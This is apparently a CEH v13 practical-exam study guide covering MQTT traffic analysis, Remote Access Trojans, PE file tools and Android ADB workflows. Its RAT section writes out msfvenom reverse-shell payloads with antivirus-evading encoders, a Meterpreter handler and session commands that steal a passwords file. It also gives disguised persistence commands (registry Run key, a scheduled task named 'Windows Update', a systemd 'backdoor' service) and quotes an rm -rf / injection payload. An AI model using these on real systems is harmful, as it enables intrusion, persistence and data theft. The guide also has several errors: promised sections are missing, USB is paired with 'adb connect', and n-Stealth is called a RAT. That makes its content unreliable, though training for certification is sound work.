# CEH v13 Practical Exam - Enhancement Content Sections

**Version:** 1.0  
**Date:** 2026-06-21  
**Purpose:** Comprehensive markdown sections for CEH manual enhancements  
**Format:** Ready for GitHub Pages integration

---

## Table of Contents

1. [IoT & MQTT Protocol Analysis](#iot--mqtt-protocol-analysis) - Domain 5/6
2. [Remote Access Trojan (RAT) Fundamentals](#remote-access-trojan-rat-fundamentals) - Challenge 10
3. [PE File Analysis Tools](#pe-file-analysis-tools) - Domain 4
4. [Advanced ADB Workflows](#advanced-adb-workflows) - Challenge 7
5. [Tcpdump Command-Line Packet Capture](#tcpdump-command-line-packet-capture) - Domain 6
6. [Tshark CLI Wireshark Analysis](#tshark-cli-wireshark-analysis) - Domain 6
7. [OS Fingerprinting & TTL Analysis](#os-fingerprinting--ttl-analysis) - Challenge 12

---

## IoT & MQTT Protocol Analysis

### What is MQTT?

**MQTT (Message Queuing Telemetry Transport)** is a lightweight publish-subscribe protocol designed for IoT devices with limited bandwidth and battery power. Unlike HTTP (request-response), MQTT uses a broker-based architecture where devices publish and subscribe to topics.

**Key Characteristics:**
- **Lightweight:** Minimal overhead, works on 2G networks
- **Publish-Subscribe:** Many-to-many communication
- **Broker-Based:** Central message router
- **Topic-Based:** Hierarchical message organization
- **QoS Levels:** Quality of Service (0, 1, 2)

**Common Ports:**
- 1883 = MQTT (unencrypted, default)
- 8883 = MQTT over TLS/SSL
- 9001 = MQTT over WebSockets

### MQTT Architecture

**Three Key Roles:**

1. **MQTT Broker** (server)
   - Receives messages from publishers
   - Distributes to subscribers
   - Common brokers: Mosquitto, HiveMQ, EMQ X
   - Default port: 1883

2. **Publisher** (IoT device/sensor)
   - Publishes sensor data to topics
   - Example: Temperature sensor publishes to `home/livingroom/temperature`
   - Does NOT connect to subscribers directly

3. **Subscriber** (monitoring device/app)
   - Listens to specific topics
   - Receives all published messages
   - Can subscribe to multiple topics

### MQTT Message Types

**1. CONNECT**
- First message from client to broker
- Contains client ID, username, password
- Broker responds with CONNACK (acknowledgment)
- Example: IoT device connecting for first time

**2. PUBLISH**
- Actual data transmission
- Contains: Topic name, payload, QoS level
- Example: `{"temperature": 23.5, "humidity": 45}` published to `sensors/livingroom/env`

**3. SUBSCRIBE**
- Client expresses interest in a topic
- Can use wildcards:
  - `+` = Single level wildcard (e.g., `home/+/temperature`)
  - `#` = Multi-level wildcard (e.g., `home/#`)
- Broker responds with SUBACK

**4. UNSUBSCRIBE**
- Client stops listening to topic

**5. DISCONNECT**
- Client closes connection gracefully
- May have last-will message

### Topic Structure & Naming

**Hierarchical Format:**
```
home/livingroom/temperature
device/sensor/measurement
iot/building/floor3/room302/occupancy
```

**Topic Best Practices:**
- Use forward slashes `/` as separators
- Lowercase names
- Descriptive (what, where, type)
- Avoid leading slash (reserved)

**Common IoT Topic Patterns:**

| Pattern | Example | Use Case |
|---------|---------|----------|
| `location/device/sensor` | `home/kitchen/temperature` | Home automation |
| `building/floor/room` | `office/2nd/meeting_room_a` | Commercial IoT |
| `category/region/device` | `weather/north_america/station_42` | Monitoring systems |
| `org/project/location` | `company/factory_a/production_line_1` | Industrial IoT |

### MQTT QoS (Quality of Service)

| QoS | Name | Delivery | Use Case |
|-----|------|----------|----------|
| 0 | At Most Once | Fire-and-forget | Sensor data (loss acceptable) |
| 1 | At Least Once | Acknowledged | Important commands |
| 2 | Exactly Once | Full handshake | Financial transactions |

### Analyzing MQTT in Wireshark

**Starting Point:**
```
1. Open PCAP file in Wireshark
2. Apply filter: mqtt
3. Observe MQTT protocol packets
```

**Wireshark Filters:**

```
# All MQTT traffic
mqtt

# MQTT PUBLISH messages only
mqtt.msgtype == 3

# MQTT CONNECT messages
mqtt.msgtype == 1

# MQTT SUBSCRIBE messages
mqtt.msgtype == 8

# Specific topic name (contains "temperature")
mqtt.topic contains "temperature"

# From specific broker IP
ip.src == 192.168.1.100 && mqtt

# Specific client
mqtt.clientid == "sensor_01"
```

**What to Look For in Packets:**

1. **Connection Phase:**
   - CONNECT packet → check client ID, username/password presence
   - CONNACK response → verify successful connection

2. **Publish Packets:**
   - Topic name → understand what data is being shared
   - Payload → actual sensor data or commands
   - QoS flag → importance level

3. **Subscribe Packets:**
   - Topic name/wildcard → what subscriber is listening for
   - Client ID → which device is subscribing

### MQTT Security Concerns in Exams

**Common Vulnerabilities:**

1. **Default Credentials**
   - Many MQTT brokers have default username/password
   - Example: Mosquitto default has NO authentication
   - Enable authentication with mosquitto.conf

2. **Unencrypted Traffic**
   - Port 1883 transmits data in PLAIN TEXT
   - Topic names visible in PCAP
   - Payloads readable
   - Credentials exposed

3. **Topic Enumeration**
   - Subscribe to `#` to see ALL topics
   - Reveals device structure and data patterns
   - Privacy risk for industrial IoT

4. **Payload Injection**
   - JSON/custom format payloads vulnerable to injection
   - Example: `{"command": "rm -rf /"}` in payload
   - No built-in input validation

### Identifying Malicious MQTT Activity

**Red Flags in Wireshark:**

1. **Unusual Topic Names**
   ```
   admin/command
   control/shell
   system/exec
   /cmd/execute
   ```

2. **Large Payloads**
   - Normal sensor data: 50-200 bytes
   - Suspicious: 10+ KB payloads
   - Could be data exfiltration or code

3. **Abnormal Publish Frequency**
   - Normal: Every 5-60 seconds
   - Suspicious: Every millisecond (DDoS pattern)
   - Suspicious: Sudden spike in frequency

4. **Subscription Patterns**
   - Normal: Client subscribes on connect, stays subscribed
   - Suspicious: Subscribing to wildcard topics (#)
   - Suspicious: Client subscribing to administrative topics

5. **Connection Behavior**
   - Normal: CONNECT → stays connected → DISCONNECT
   - Suspicious: Rapid connect/disconnect cycles
   - Suspicious: Multiple simultaneous connections from same IP

### Challenge 18: Extracting IoT Device Topic Names

**Scenario:** Analyze MQTT traffic in PCAP file to identify sensor readings

**Step-by-Step Approach:**

1. **Open PCAP in Wireshark**
   ```
   File → Open → capture.pcapng
   ```

2. **Apply MQTT Filter**
   ```
   Display Filter: mqtt
   Click Apply
   ```

3. **Locate PUBLISH Packets**
   - Look for packets with mqtt.msgtype == 3
   - These contain actual data transmission

4. **Examine Packet Details**
   - Click on PUBLISH packet
   - Expand "Message Type: Publish" in details pane
   - Note: Topic Name field

5. **Common Topic Patterns in Exam**
   ```
   home/temperature
   office/occupancy
   sensor/humidity
   device/status
   alarm/triggered
   ```

6. **Extract Topic Names**
   - Method 1: Manual inspection in Wireshark
   - Method 2: Use tshark to extract:
     ```bash
     tshark -r capture.pcapng -Y mqtt.msgtype==3 -T fields -e mqtt.topic
     ```

7. **Identify Sensor Types**
   ```
   "temperature" topic → temperature sensor
   "humidity" topic → humidity sensor
   "motion" topic → motion detector
   "battery" topic → battery level indicator
   ```

8. **Answer Format**
   - Count unique topics: e.g., "4 topics detected"
   - List them: "temperature, humidity, motion, battery"
   - Identify device type: "Environmental monitoring station"

**Exam Tips:**
- Look for readable topic names in MQTT PUBLISH packets
- Topic names are NOT encrypted on port 1883
- Use Wireshark's "Follow TCP Stream" for first CONNECT packet
- Payload may be binary or JSON depending on device

### MQTT Challenge Walkthrough Example

**Given:** `iot_capture.pcapng` contains 30 minutes of MQTT traffic

**Question:** "What is the topic name used by the temperature sensor?"

**Solution:**

1. Open Wireshark → Load pcapng file
2. Filter: `mqtt.msgtype == 3` (PUBLISH only)
3. Look through packets in order
4. Examine packet details:
   ```
   Packet 145
   Protocol: MQTT
   Message Type: Publish (3)
   Topic Name: home/sensors/kitchen/temperature
   Payload: {"temp": 23.5, "unit": "C"}
   ```
5. Answer: `home/sensors/kitchen/temperature`

---

## Remote Access Trojan (RAT) Fundamentals

### What is a RAT?

A **Remote Access Trojan (RAT)** is malware that gives an attacker complete remote control over a victim's computer, similar to legitimate remote administration tools but without authorization.

**Key Characteristics:**
- **Backdoor Access:** Hidden method to reconnect
- **Full System Control:** Execute commands, access files
- **Persistence:** Survives reboots via registry/cron jobs
- **Stealth:** Often hides processes and network connections
- **Data Exfiltration:** Can steal files and credentials

**Difference from Other Malware:**

| Type | Control | Purpose |
|------|---------|---------|
| RAT | Complete remote shell | Full system access |
| Worm | Self-replicating | Spread across network |
| Spyware | Limited (stealing data) | Surveillance only |
| Trojan | Backdoor only | Initial access |

### Common RAT Tools

**1. Metasploit Meterpreter**
- Part of Metasploit Framework
- Payload-based staging
- Reverse shells most common
- Used in exam

**2. n-Stealth**
- Commercial RAT from mid-2000s
- IP address-based access
- Simple command shell
- May appear in exam case studies

**3. Poison Ivy**
- Older RAT (discontinued)
- Lightweight, low detection
- Historical reference in exams

**4. BackOrifice**
- Very old Windows RAT (Windows 95/98)
- Historical only, not used today
- Exam context: malware analysis

**5. Real VNC / TeamViewer**
- Legitimate remote tools
- Can be ABUSED by attackers
- Used as RAT if credentials compromised

### How RATs Work: Attack Chain

**Phase 1: Initial Access**
```
1. Attacker delivers payload (email, website, exploit)
2. Victim executes malware
3. RAT installs itself on system
```

**Phase 2: Persistence**
```
Windows:
- Add to HKEY_LOCAL_MACHINE\Run registry
- Create scheduled task
- Hide in startup folder
- DLL injection

Linux/Mac:
- Add to ~/.bashrc or ~/.bash_profile
- Create cron job
- systemd service
```

**Phase 3: Communication (Reverse Shell)**
```
Victim initiates connection to attacker (avoiding firewalls):
victim_machine:random_port → attacker_ip:listening_port
Attacker gains shell prompt on victim
```

**Phase 4: Command Execution**
```
Attacker types commands:
> whoami
> cd c:\Users
> dir
> ipconfig /all
> net user administrator NewPassword123
Victim executes, returns output to attacker
```

**Phase 5: Data Exfiltration**
```
> move c:\important\file.txt c:\temp\
> type c:\temp\file.txt
> [data sent to attacker]
```

### Meterpreter Session Basics

**Session Types:**

1. **Reverse TCP Shell**
   ```
   Victim connects back to attacker
   Attacker IP: 192.168.1.100 port 4444
   Victim connects: 192.168.1.50:12345 → 192.168.1.100:4444
   Advantages: Bypasses firewall (outbound allowed)
   ```

2. **Bind Shell**
   ```
   Attacker connects to victim
   Victim listens on port 4444
   Attacker connects: 192.168.1.100 → 192.168.1.50:4444
   Advantages: Simpler setup
   Disadvantages: Firewall may block inbound
   ```

**Session Management:**

```
# List active sessions
sessions -l

# Interact with session 1
sessions -i 1

# Background current session
[Ctrl+Z] or type: background

# List running jobs
jobs -l

# Interact with background job
jobs -i 1

# Kill session
sessions -k 1
```

### Payload Generation with Msfvenom

**Basic Reverse Shell (Windows):**

```bash
# Generate .exe payload (Metasploit)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f exe > backdoor.exe

# Generate .bat file
msfvenom -p windows/cmd/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f bat > shell.bat

# Generate for Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f elf > linux_shell
```

**Obfuscation Techniques:**

```bash
# Add encoder to evade AV
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -e x86/shikata_ga_nai \
  -i 5 \
  -f exe > obfuscated.exe

# Flags:
# -e = Encoder
# -i = Iterations (5 passes)
# -f = Format (exe, dll, bat, etc)
```

### Metasploit Handler (Listener Setup)

**Starting Handler:**

```bash
# Launch Metasploit
msfconsole

# Setup handler for reverse TCP
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_tcp
msf> set LHOST 192.168.1.100
msf> set LPORT 4444
msf> run

# Handler now listening on port 4444
# Waiting for victim to connect...
```

**When Victim Connects:**

```
[*] Started reverse TCP handler on 192.168.1.100:4444
[*] Sending stage (173 bytes) to 192.168.1.50
[*] Meterpreter session 1 opened (192.168.1.100:4444 <- 192.168.1.50:63842)

meterpreter >
```

### Meterpreter Command Execution

**System Information:**

```
meterpreter > getuid
Server username: DESKTOP-ABC1234\Administrator

meterpreter > sysinfo
Computer Name: DESKTOP-ABC1234
OS: Windows 10 (build 19045)
Architecture: x64
Processors: 4
RAM: 8192 MB

meterpreter > ipconfig
IPv4 Address: 192.168.1.50
Subnet Mask: 255.255.255.0
Gateway: 192.168.1.1
```

**File Operations:**

```
meterpreter > pwd
c:\Users\Admin\Desktop

meterpreter > ls
Mode   Size  Type  Modified              Name
----   ----  ----  --------              ----
20666  2048  dir   2024-06-21 14:32:01  Documents
20666  2048  dir   2024-06-21 14:32:01  Downloads
100666 5242  file  2024-06-21 14:30:15  passwords.txt

meterpreter > download passwords.txt /tmp/
[*] Downloading: passwords.txt -> /tmp/passwords.txt
[*] Downloaded 5242 bytes

meterpreter > upload /tmp/evil.exe c:\windows\temp\
[*] uploading  : /tmp/evil.exe -> c:\windows\temp\evil.exe
[*] Uploaded 76289 bytes
```

**Process & Registry Access:**

```
meterpreter > ps  # List processes
meterpreter > kill PID  # Kill process
meterpreter > execute -f cmd.exe -i  # Interactive command shell
meterpreter > reg query HKLM\\Software\\Microsoft\\Windows\\Run
meterpreter > reg set HKLM\\Software\\Microsoft\\Windows\\Run "Svchost" "c:\windows\temp\evil.exe"
```

### Data Exfiltration Patterns

**Detecting RAT Activity in Network Traffic:**

1. **Reverse TCP Connections**
   - Victim initiates outbound connection to attacker IP
   - Unusual ports (not web, email, DNS)
   - Persistent connection (hours/days)

2. **Command Data**
   - Small uploads (commands ~50-200 bytes)
   - Large downloads (stolen files)
   - Bidirectional traffic pattern

3. **Indicators in Wireshark:**
   ```
   Filter: ip.src == 192.168.1.50 && tcp.dstport != 80,443,53
   Look for: Persistent connections to external IPs
   
   Follow TCP Stream: Contains command output/shell interaction
   ```

4. **File Exfiltration**
   - Sudden large upload from victim
   - Destination: Attacker IP
   - Protocol: Reverse shell or FTP/SMB tunnel

### Persistence Mechanisms

**Windows Registry (Survives Reboot):**

```batch
# Run key - starts on login
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v Svchost /t REG_SZ /d "c:\windows\temp\evil.exe"

# Services - runs as system
sc create Svchost binPath= "c:\windows\temp\evil.exe"
sc start Svchost

# Task Scheduler
schtasks /create /tn "Windows Update" /tr "c:\windows\temp\evil.exe" /sc onlogon
```

**Linux Persistence:**

```bash
# Add to cron (every 5 minutes)
crontab -e
*/5 * * * * /tmp/backdoor

# Add to .bashrc (every shell)
echo "/tmp/backdoor &" >> ~/.bashrc

# systemd service
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/bin/svc
Restart=on-failure
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable backdoor
```

### Challenge 10: Detecting RAT in PCAP

**Scenario:** Analyze network traffic to identify RAT activity

**What to Look For:**

1. **Reverse Connection Pattern**
   ```
   Victim IP → Unknown External IP on non-standard port
   Example: 192.168.1.50 → 203.0.113.45 on port 4444
   This is suspicious - should be inbound traffic for normal services
   ```

2. **Suspicious Ports**
   - 4444, 5555, 6666, 7777, 8888 (common Metasploit)
   - 31337 (classic backdoor port)
   - Random high ports (>10000)

3. **Bidirectional Data Flow**
   - Small upstream packets (commands)
   - Small downstream packets (command output)
   - Not typical of web, email, or file transfer

4. **Long Duration Connection**
   - Single TCP session lasting hours/days
   - Other services use short sessions
   - Example: HTTP connection = 1-5 minutes, RAT = persistent

**Wireshark Analysis Steps:**

```
1. Open PCAP file
2. Filter: ip.dst == <external_ip>
3. Look for anomalies:
   - Reverse TCP connection
   - Unusual port
   - Long duration
   - No corresponding inbound traffic

4. Extract data: Follow TCP Stream
   - Look for shell commands
   - Look for command output
   - Note any file transfers

5. Identify attacker IP and port
```

**Exam Answer Format:**

```
Q: "What IP address initiated the RAT connection?"
A: 203.0.113.45

Q: "What port was the RAT listening on?"
A: 4444

Q: "What commands were executed?"
A: ipconfig, whoami, dir, net user

Q: "What files were exfiltrated?"
A: C:\Users\Admin\Documents\passwords.txt
```

---

## PE File Analysis Tools

### What is PE (Portable Executable)?

**PE Format** is the executable file format for Windows binaries (.exe, .dll, .sys).

**File Structure:**

```
┌─────────────────────────────────┐
│  DOS Header (64 bytes)          │  Legacy MS-DOS compatibility
│  PE Signature ("PE\0\0")        │  Marks start of PE format
├─────────────────────────────────┤
│  File Header (20 bytes)         │  Machine type, sections count
│  Optional Header (224-240 bytes)│  Entry point, image size, subsystem
├─────────────────────────────────┤
│  Data Directories (128 bytes)   │  Import, export, resource locations
├─────────────────────────────────┤
│  Sections (.text, .data, .rsrc) │  Code, data, resources
├─────────────────────────────────┤
│  Import Address Table (IAT)     │  DLL functions
│  Export Directory               │  Exported functions
│  Resource Directory             │  Icons, strings, version info
└─────────────────────────────────┘
```

### Static vs Dynamic Analysis

| Static | Dynamic |
|--------|---------|
| Examine files without running | Run malware in safe environment |
| PE headers, imports, strings | Observe actual behavior |
| DIE, CFF Explorer, objdump | Debugger, monitor, Wireshark |
| Fast, no risk | Time-consuming, requires sandbox |
| Missed runtime behavior | Sees all activity |

### Detect It Easy (DIE)

**What It Does:**
- Identifies compiler, packer, language
- Detects if file is packed/encrypted
- Shows file properties and version info
- Highlights suspicious packer use
- Useful for quick malware triage

**Installation:**

```bash
# Linux
apt-get install detect-it-easy

# Windows - Download from GitHub
https://github.com/horsicq/Detect-It-Easy
```

**Starting DIE:**

```bash
# GUI mode (Linux/Windows)
DIE

# Command line mode
detect-it-easy filename.exe
```

**UI Layout:**

```
┌────────────────────────────────────────┐
│  Top: File path, Load button           │
├─────────────────┬──────────────────────┤
│ Left Pane:      │ Right Pane:          │
│ Detects:        │ File Info:           │
│ - Compiler      │ - Type: PE 32-bit    │
│ - Packer        │ - Compiler: MSVC     │
│ - Language      │ - Sections, Imports  │
│ - Entropy       │ - Version Info       │
│                 │ - Dependencies       │
└─────────────────┴──────────────────────┘
```

**Reading Results:**

**Left Pane - What It Means:**

```
✓ Compiler: Microsoft Visual C++ 14.0
  → Compiled with MSVC (legitimate)

⚠ Packer: UPX
  → File is packed (unusual for legit software)
  → Could be malware hiding code

! Entropy: 7.2 / 8.0
  → High entropy = encrypted/compressed
  → Normal: 3-5 (readable)
  → Suspicious: 7-8 (likely packed)

✓ Language: C++ / .NET
  → Programming language used
```

**Right Pane - Version Information:**

```
Click "File Info" tab → Properties → Version tab

Internal Name: explorer.exe
Original Filename: EXPLORER.EXE
Product Name: Microsoft Windows
Product Version: 10.0.19045.1
File Version: 10.0.19045.1234
Company Name: Microsoft Corporation
File Description: Windows Explorer
```

### Challenge 9: Extracting Version Number from PE

**Scenario:** "Find the File Version number from Ghostware.exe"

**Step-by-Step in DIE:**

1. **Open DIE**
   ```
   Launch DIE application
   ```

2. **Load File**
   ```
   File → Open → Select Ghostware.exe
   Click Open
   ```

3. **Wait for Analysis**
   ```
   DIE scans file (5-10 seconds)
   Results appear in left pane (Detects)
   ```

4. **Click "File Info" in Right Pane**
   ```
   Right pane shows:
   - Type: PE 32-bit / 64-bit
   - Compiler info
   - Sections list
   ```

5. **Look for Version Tab**
   ```
   In right pane, find tabs:
   - "Detects"
   - "File Info"
   - "Properties" or similar
   ```

6. **Read Version Information**
   ```
   File Version: 2.3.4.5
   Product Version: 2.3.4.5
   ```

7. **Format Answer**
   ```
   Q: "What is the File Version number?"
   A: 2.3.4.5
   
   Some formats ask for last 2 digits: 45
   Some ask without dots: 2345
   Follow question format
   ```

**Visual Cues in DIE:**

```
Example Output:

DETECTS
├── Compiler: Microsoft Visual C++ 14.0
├── Packer: None detected ✓
├── Language: C++
└── Entropy: 4.2 (normal)

FILE INFO
├── Type: PE executable 32-bit
├── Sections: .text, .data, .rsrc
├── Properties:
│   └── Version: 2.3.4.5
```

### CFF Explorer (PE Headers Tool)

**What It Does:**
- Shows PE headers in detail
- Edit binary values (hex)
- View import/export tables
- Interactive PE structure viewer
- Windows-only tool

**Installation:**

```
Download from:
https://ntcore.com/exeforum_files/cff_explorer_160.zip

Unzip and run CFF Explorer.exe
```

**Starting CFF Explorer:**

1. **Open Application**
   ```
   Run CFF Explorer.exe
   ```

2. **Load File**
   ```
   File → Open → Ghostware.exe
   ```

3. **UI Overview**
   ```
   ┌─────────────────────────────────┐
   │ Left: PE Structure Tree          │
   │ - DOS Header                    │
   │ - PE Signature                  │
   │ - File Header                   │
   │ - Optional Header               │
   │ - Data Directories              │
   │ - Sections                      │
   │ - Imports                       │
   │ - Exports (if any)              │
   ├─────────────────────────────────┤
   │ Right: Hex values and details   │
   │ - Memory offset                 │
   │ - Raw values                    │
   │ - Interpreted meaning           │
   └─────────────────────────────────┘
   ```

### PE Header Fields (CFF Explorer)

**File Header Information:**

```
Machine Type: 0x014c = Intel 386 (32-bit)
              0x8664 = x64 (64-bit)
              
Number of Sections: 4 = .text, .data, .rsrc, .reloc

Characteristics: Executable, 32/64-bit, Large address aware
```

**Optional Header:**

```
Image Base: 0x400000 (where loaded in memory)

Entry Point: 0x1234 (first instruction to execute)

Subsystem: 3 = Windows GUI
          2 = Windows CUI (console)
          1 = Native (kernel mode)

Size of Code: 12,288 bytes

Size of Data: 4,096 bytes

Stack Reserve/Commit: Memory allocated for stack
```

**Data Directories:**

```
Export Table: Function export (DLLs only)
Import Table: DLL dependencies
Resource Table: Icons, version strings
Debug Info: Debugging symbols
```

### Finding Version Information in CFF Explorer

**Path to Version Info:**

```
1. Open CFF Explorer
2. Load file
3. Left tree → Sections
4. Find ".rsrc" section
5. Right pane shows resource entries
6. Look for "3/Version Information"
7. Expand → Find FILEVERSION field
```

**Resource Section (.rsrc) Layout:**

```
Resource Directory
├── Type 3 (Version Info)
├── Type 14 (Group Icon)
├── Type 16 (Version Info)
│   └── Version Info Structure
│       ├── FILEVERSION
│       ├── PRODUCTVERSION
│       ├── CompanyName
│       ├── FileDescription
│       ├── InternalName
│       └── OriginalFilename
```

**Version Number Format:**

```
FILEVERSION: 0x0002 0x0003 0x0004 0x0005
             = 2.3.4.5
             
Each field is 16-bit (0-65535)
Displayed as: Major.Minor.Patch.Build
```

### Alternative: PE Analysis with Command-Line Tools

**Using strings command (Linux/Mac):**

```bash
# Extract all printable strings from executable
strings Ghostware.exe | grep -i version

# Output might show:
# FileVersion: 2.3.4.5
# ProductVersion: 2.3.4.5
# CompanyName: Unknown
```

**Using objdump (Linux):**

```bash
# Show PE headers
objdump -h Ghostware.exe

# Show imports
objdump -x Ghostware.exe | grep -A 20 "Import"

# Extract resources
objdump -s -j .rsrc Ghostware.exe
```

**Using exiftool (Cross-platform):**

```bash
# Extract file metadata
exiftool Ghostware.exe

# Output shows:
# FileVersion: 2.3.4.5
# ProductVersion: 2.3.4.5
# CompanyName: Unknown
# FileDescription: [description]

# Search for specific field
exiftool Ghostware.exe | grep -i "version"
```

### PE Analysis Exam Tips

**Common Question Types:**

1. **Version Number Extraction**
   ```
   Q: "Find the File Version number"
   A: Use DIE or CFF Explorer → Version Info
   ```

2. **Compiler Identification**
   ```
   Q: "What compiler was used?"
   A: DIE → Compiler field
   Answer: Microsoft Visual C++, Borland Delphi, etc.
   ```

3. **Packer Detection**
   ```
   Q: "Is the file packed?"
   A: DIE → Packer field
   Answer: Yes - UPX, Yes - Themida, No
   ```

4. **Dependency Analysis**
   ```
   Q: "What DLLs does it import?"
   A: CFF Explorer → Imports section
   Answer: kernel32.dll, user32.dll, advapi32.dll, etc.
   ```

5. **Architecture Detection**
   ```
   Q: "Is it 32-bit or 64-bit?"
   A: DIE → Type field OR CFF → Machine type
   Answer: PE 32-bit or PE 64-bit
   ```

### PE Analysis Workflow for Malware Triage

**Quick Static Analysis:**

```
1. Run DIE on suspicious file
   ├── Check Packer field
   ├── Check Entropy (normal ~4.2, packed ~7.5)
   ├── Check Company Name (Microsoft, unknown?, suspicious?)
   └── Check Compiler (legitimate vs suspicious)

2. If packed or suspicious packer:
   ├── Likely malware
   ├── Use DIE to identify packer
   ├── Do NOT execute (static analysis only)
   └── Report as suspicious

3. If normal PE properties:
   ├── Check imports for suspicious DLLs
   ├── Run CFF Explorer for detailed headers
   ├── Extract strings for C2 IP addresses
   └── Compare version info with legitimate version

4. Extract strings:
   strings Ghostware.exe | grep -E "(http|ftp|cmd|powershell|exec)"
   ├── Look for C2 URLs
   ├── Look for command patterns
   ├── Look for suspicious file operations
```

---

## Advanced ADB Workflows

### ADB Quick Reference

**What is ADB?**
ADB (Android Debug Bridge) is a command-line tool to interact with Android devices for development, testing, and debugging.

**Connection Methods:**
1. **USB Cable:** `adb connect` (physical device)
2. **Wi-Fi (tcpip mode):** `adb tcpip 5555` then `adb connect IP:5555`
3. **Emulator:** Automatic in Android Studio

### Challenge 4: Android Steganography Deep Dive

**Scenario:** Extract hidden data from Android device photos

**Devices used for hiding steganographic data:**
1. `/sdcard/DCIM/Camera/` - Photo storage location
2. `/sdcard/Pictures/` - Additional picture directory
3. `/sdcard/Downloads/` - Downloaded files

**Full ADB Workflow:**

**Step 1: Connect to Android Device**

```bash
# USB connection (device must have USB debugging enabled)
adb devices
# Output: List of devices

# Or Wi-Fi connection
adb tcpip 5555
adb connect 192.168.1.100:5555
adb devices
```

**Step 2: List Available Photos**

```bash
# List photos in Camera folder
adb shell ls -la /sdcard/DCIM/Camera/

# Output:
# drwxrwxr-x  3 root sdcard_rw     4096 Jun 21 14:32 .
# -rw-rw-rw-  1 root sdcard_rw   524288 Jun 21 14:30 IMG_20240621_143000.jpg
# -rw-rw-rw-  1 root sdcard_rw   786432 Jun 21 14:31 IMG_20240621_143100.jpg
```

**Step 3: Pull Photos to Analysis Computer**

```bash
# Pull single photo
adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./

# Pull entire directory
adb pull /sdcard/DCIM/Camera/ ./photos/
```

**Step 4: Analyze with Steghide**

```bash
# Extract steganographic data from image
steghide extract -sf IMG_20240621_143000.jpg

# Output:
# Enter passphrase:  [no passphrase needed for default]
# The file "secret.txt" has been extracted.

# Read extracted data
cat secret.txt
# Output: Contains hidden message or commands
```

**Step 5: Extract Metadata**

```bash
# Use exiftool to check metadata
exiftool IMG_20240621_143000.jpg

# Output:
# Image Width: 4096
# Image Height: 3072
# Camera Model: [device model]
# Date/Time Original: 2024:06:21 14:30:00
# GPS Latitude: [if available]
```

### Challenge 7: Advanced ADB Workflows

**Objective:** Navigate Android file system, find hidden files, extract data

**Part 1: Installing Applications**

```bash
# Install APK (Android application)
adb install application.apk

# Output:
# Success

# Check installation
adb shell pm list packages | grep application_name

# Reinstall (replace existing)
adb install -r application.apk

# Uninstall
adb uninstall com.example.app
```

**Where APKs are stored:**
```bash
# System apps
ls /system/app/
ls /system/priv-app/

# User apps
ls /data/app/

# Access requires root via adb root
adb root
adb shell ls /data/app/
```

**Part 2: Accessing Protected Directories**

```bash
# Check current user (usually shell user)
adb shell whoami
# Output: shell (not root)

# Try accessing /data/data (requires root)
adb shell ls /data/data/
# Output: Permission denied

# Gain root access
adb root
# Now running as root

adb shell whoami
# Output: root

# Now can access protected directories
adb shell ls /data/data/
```

**Important Directories:**

```bash
/sdcard/
├── DCIM/
│   └── Camera/              # Photos from camera app
├── Pictures/                # Screenshots and images
├── Downloads/               # Downloaded files
├── Documents/               # Documents
└── .hidden/                 # Hidden folder (starts with .)

/data/
├── app/                     # User apps
├── data/
│   └── com.example.app/
│       ├── databases/       # SQLite databases
│       ├── files/           # App private files
│       ├── cache/           # App cache
│       └── shared_prefs/    # App settings
└── system/                  # System data (root only)

/system/
├── app/                     # System apps
└── framework/               # Android framework
```

**Part 3: SQLite Database Extraction**

```bash
# List app databases
adb shell ls /data/data/com.example.app/databases/

# Output:
# app.db
# cache.db

# Pull database
adb pull /data/data/com.example.app/databases/app.db ./

# Analyze on computer
sqlite3 app.db

# SQLite commands:
sqlite> .tables
users notes settings

sqlite> .schema users
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    password TEXT,
    email TEXT
);

sqlite> SELECT * FROM users;
1|admin|secret123|admin@example.com
2|user|pass456|user@example.com

sqlite> .exit
```

**Part 4: Logcat Analysis**

```bash
# Real-time log stream
adb logcat

# Filter for specific app
adb logcat | grep com.example.app

# Save logs to file
adb logcat > logcat_output.log

# Clear logs
adb logcat -c

# Filter by log level (ERROR, WARNING, INFO, DEBUG, VERBOSE)
adb logcat *:E     # Show only errors
adb logcat *:W     # Show warnings and errors
adb logcat *:D     # Show debug and above

# Find sensitive data in logs
adb logcat | grep -iE "(password|token|secret|key|auth)"
```

**Sensitive Data Found in Logs:**
- API tokens and keys
- User passwords (if logged)
- Device tokens
- Database queries
- File paths
- Network requests

**Part 5: Screen Capture and Input**

```bash
# Take screenshot
adb shell screencap /sdcard/screen.png

# Pull screenshot
adb pull /sdcard/screen.png ./

# Type text (simulates keyboard)
adb shell input text "admin"
adb shell input text "password123"

# Tap screen (x, y coordinates)
adb shell input tap 500 1200

# Swipe gesture
adb shell input swipe 100 500 100 100  # Swipe up

# Key press (HOME, BACK, VOLUME_UP, etc)
adb shell input keyevent 3  # HOME
adb shell input keyevent 4  # BACK
```

### Challenge 4 Walkthrough: Hidden Photo Data

**Given:** Android device with hidden steganographic data in photos

**Question:** "Extract the hidden data from IMG_20240621_143000.jpg"

**Solution:**

1. **Connect Device**
   ```bash
   adb devices
   adb connect 192.168.1.100:5555
   ```

2. **List Photos**
   ```bash
   adb shell ls /sdcard/DCIM/Camera/
   # Find: IMG_20240621_143000.jpg
   ```

3. **Pull Photo**
   ```bash
   adb pull /sdcard/DCIM/Camera/IMG_20240621_143000.jpg ./
   ```

4. **Extract Steganography**
   ```bash
   steghide extract -sf IMG_20240621_143000.jpg
   # Prompted for passphrase (usually none)
   # File extracted: secret.txt or similar
   ```

5. **Read Hidden Data**
   ```bash
   cat secret.txt
   # Output: Hidden message/commands
   ```

6. **Report**
   ```
   Hidden data: "Attacker command execution logs"
   Type: Text file
   Location: /sdcard/DCIM/Camera/IMG_20240621_143000.jpg
   ```

